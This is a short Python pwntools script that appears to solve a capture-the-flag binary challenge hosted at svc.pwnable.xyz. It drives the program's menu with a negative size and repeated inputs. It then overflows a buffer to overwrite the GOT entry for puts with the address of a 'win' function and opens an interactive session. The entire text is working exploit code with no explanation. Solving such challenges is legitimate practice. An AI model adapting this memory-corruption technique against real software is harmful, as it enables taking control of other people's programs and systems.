from pwn import *

#sh = process('./challenge')
sh =  remote('svc.pwnable.xyz', 30036)
elf = ELF('./challenge')

sh.sendlineafter('> ', '5')
sh.sendlineafter(': ', '-1')
sh.sendline('A')


sh.sendlineafter('> ', '4')
sh.sendlineafter('> ', '1')
sh.sendlineafter('> ', '1')


for i in range(0, 9):
    sh.sendlineafter('> ', '3')
    sh.sendlineafter('> ', '1')
    sh.sendlineafter('> ', '42')



sh.sendlineafter('> ' ,'5')
sh.sendline("A"*0xa0 + p64(elf.got["puts"]))

sh.sendlineafter('> ', '5')
sh.sendline(p64(elf.symbols['win']))

sh.sendlineafter('> ', '17')



sh.interactive()
